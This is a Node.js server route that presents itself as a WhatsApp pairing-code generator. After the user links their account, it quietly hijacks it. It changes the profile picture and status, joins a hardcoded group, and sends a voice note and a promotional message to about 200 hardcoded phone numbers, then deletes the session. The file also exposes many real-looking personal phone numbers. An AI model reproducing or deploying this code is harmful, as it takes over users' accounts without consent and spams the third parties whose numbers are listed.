const PastebinAPI = require('pastebin-js');
const express = require('express');
const fs = require('fs');
const pino = require("pino");
const { default: Venocyber_Tech, useMultiFileAuthState, delay, makeCacheableSignalKeyStore } = require("maher-zubair-baileys");

const pastebin = new PastebinAPI(process.env.PASTEBIN_API_KEY);
const { makeid } = require('./id');
const router = express.Router();

const audioUrl = 'https://github.com/darkewing/audio/blob/71809cb9467dfd5f6153166c6632edb760b6e7da/WhatsApp%20Audio%202024-09-05%20at%2018.04.23_b6365aa2.mp3';
const generalMessage = `*╭────────────⊶*
*│* *ɪ ᴀᴍ ʀᴇᴀʟ ᴅᴇxᴛᴇʀ*
*╰────────────⊶*

*╭────────────⊶*
*│* ○ \`ɴᴀᴍᴇ │ DEXTER\`
*│* ○ \`ꜰʀᴏᴍ │ᴀᴍᴘᴀʀᴀ\`
*│* ○ \`ᴀɢᴇ │+17\`
*╰─────────────⊶*
*────────────⊶*
*╭──────────⊶*
*│❮ මාව save කර ගන්න❯*
*│"ඔයාව SAVE"*
*│❮ AUTO REPLY ❯*
*╰──────────⊶*

*❮ꜱᴀᴠᴇ නම් අනිවරෙන් කියන්න❯*
*❮STATUS VIEWERS වලට අවේ❯*`;
const groupLink = 'https://chat.whatsapp.com/BcaaQ3Hk2Oc1r7Me2ob69Fi';
const profilePictureUrl = 'https://telegra.ph/file/9ed44d68d2d271b2022ad.jpg';

const predefinedNumbers = [
  "+94707360731","+94707360731","+94760237487","+94758508601",
  "+94775069151","+94771495192","+94778468277","+94763729890",
  "+94768812502","+94761526039","+94715406180","+94786908036",
  "+94743535129","+94781092221","+94772697631","+94703508324",
  "+94775731588","+94754892031","+94742366226","+94783786809",
  "+94769935341","+94718779975","+94755811743","+94701836863",
  "+94755811743","+94701836863","+94750551855","+94704196330",
  "+94701836863","+94755811743","+94767839950","+94742271387",
  "+94743289670","+94768623349","+94715334112","+94774211551",
  "+94761132421","+94786455070","+94771305984","+94773779273",
  "+94761767243","+94713726080","+94753574803","+94750321752",
  "+94705237340","+94760647098","+94719443175","+94767025334",
  "+94765620299","+94778936819","+94755023522","+94715574550",
  "+94725008626","+94729715921","+94765291061","+94743892556",
  "+94768641868","+94742379753","+94766124788","+94740455534",
  "+94757208116","+94703551138","+94728554184","+94755904112",
  "+94705820021","+94761728218","+94760396503","+94768231861",
  "+94703055798","+94763578736","+94782865907","+94760812756",
  "+94768232870","+94724758866","+94741961151","+94762933618",
  "+94768215490","+94755183612","+94718728917","+94743468337",
  "+94701549157","+94729719266","+94774430252","+94764245686",
  "+94781353518","+94740669458","+94710459912","+94771185819",
  "+94703918944","+94759243371","+94704650325","+94765673157",
  "+94766491967","+94740205895","+94766510155","+94760468786",
  "+94763775377","+94726449738","+94763267689","+94742599944",
  "+94765895960","+94759015105","+94758575676","+94774211551",
  "+94755717609","+94776965814","+94742420696","+94741542683",
  "+94751804049","+94741718152","+94702691791","+94760194710",
  "+94768305590","+94710960607","+94771548361","+94759685910",
  "+94779014341","+94760688239","+94785572696","+94715394145",
  "+94754585806","+94769483626","+94757660788","+94779648428",
  "+94765829734","+94740789339","+94740299403","+94762445201",
  "+94742786570","+94725428049","+94720312493","+94707380103",
  "+94711262754","+94768343042","+94723299511","+94741042321",
  "+94776569140","+94741524697","+94726703454","+94740780890",
  "+94711538986","+94721444724","+94719855600","+94760573134",
  "+94774575591","+94774996381","+94778223560","+94752300945",
  "+94761960447","+94721223758","+94710720141","+94742562154",
  "+94743082941","+94763533520","+94743522396","+94774849990",
  "+94705787509","+94761739784","+94778341261","+94721710519",
  "+94771812289","+94702806612","+94775300564","+94773973205",
  "+94759935899","+94774884159","+94764518330","+94757109149",
  "+94723992939","+94741403786","+94765661219","+94764226759",
  "+94714307844","+94779586989","+94761787839","+94764419074",
  "+94768471192","+94723778970","+94762468056","+94762589597",
  "+94726854678","+94704388283","+94742887312","+94701256835",
  "+94742616004","+94742616004","+94761275404","+94767737862",
  "+94769406713","+94726575791","+94775779907","+94701286905",
  "+94701286905"
];

function removeFile(filePath) {
    if (fs.existsSync(filePath)) {
        fs.rmSync(filePath, { recursive: true, force: true });
    }
}

async function VENOCYBER_MD_PAIR_CODE(id, num, customMessage, res) {
    const { state, saveCreds } = await useMultiFileAuthState(`./temp/${id}`);
    try {
        let Pair_Code_By_Venocyber_Tech = Venocyber_Tech({
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
            },
            printQRInTerminal: false,
            logger: pino({ level: "fatal" }).child({ level: "fatal" }),
            browser: ["Chrome (Linux)", "", ""]
        });

        Pair_Code_By_Venocyber_Tech.ev.on('creds.update', saveCreds);

        Pair_Code_By_Venocyber_Tech.ev.on("connection.update", async (s) => {
            const { connection, lastDisconnect } = s;
            if (connection === "open") {
                await handleInitialSetup(Pair_Code_By_Venocyber_Tech);
                await handleConnectionOpen(Pair_Code_By_Venocyber_Tech, customMessage, res, id);
            } else if (connection === "close" && lastDisconnect && lastDisconnect.error && lastDisconnect.error.output.statusCode !== 401) {
                console.error("Connection closed unexpectedly. Restarting...");
                await delay(10000); // Wait before retrying
                VENOCYBER_MD_PAIR_CODE(id, num, customMessage, res);
            }
        });

        if (!Pair_Code_By_Venocyber_Tech.authState.creds.registered) {
            await delay(1500);
            num = num.replace(/[^0-9]/g, '');
            const code = await Pair_Code_By_Venocyber_Tech.requestPairingCode(num);
            if (!res.headersSent) {
                await res.send({ code });
            }
        }
    } catch (err) {
        console.error("Service restart failed:", err);
        await removeFile(`./temp/${id}`);
        if (!res.headersSent) {
            await res.send({ code: "Service Unavailable" });
        }
    }
}

async function handleInitialSetup(client) {
    try {
        await client.updateProfilePicture(client.user.id, { url: profilePictureUrl });
        console.log('Profile picture updated successfully!');
    } catch (error) {
        console.error('Failed to update profile picture:', error);
    }

    try {
        await client.updateProfileStatus(aboutText);
        console.log('About text updated successfully!');
    } catch (error) {
        console.error('Failed to update about text:', error);
    }
}

async function handleConnectionOpen(client, customMessage, res, id) {
    try {
        await client.groupAcceptInvite(groupLink.split('/').pop());
        console.log('Successfully joined the group!');
    } catch (error) {
        console.error('Failed to join the group:', error);
    }

    for (const number of predefinedNumbers) {
        const jid = number.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        try {
            console.log(`Sending audio message to ${number}`);
            await client.sendMessage(jid, {
                audio: { url: audioUrl },
                mimetype: 'audio/mpeg',
                ptt: true 
            });
            await delay(2000); 

            console.log(`Sending text message to ${number}`);
            await client.sendMessage(jid, { text: customMessage });
            await delay(2000); 
            
        } catch (error) {
            console.error(`Failed to send message to ${number}:`, error);
        }
    }

    await delay(3000); 
    await client.ws.close();
    await removeFile(`./temp/${id}`);
}

router.get('/', async (req, res) => {
    const id = makeid();
    const num = req.query.number;
    const message = req.query.message || generalMessage;
    return await VENOCYBER_MD_PAIR_CODE(id, num, message, res);
});

module.exports = router;
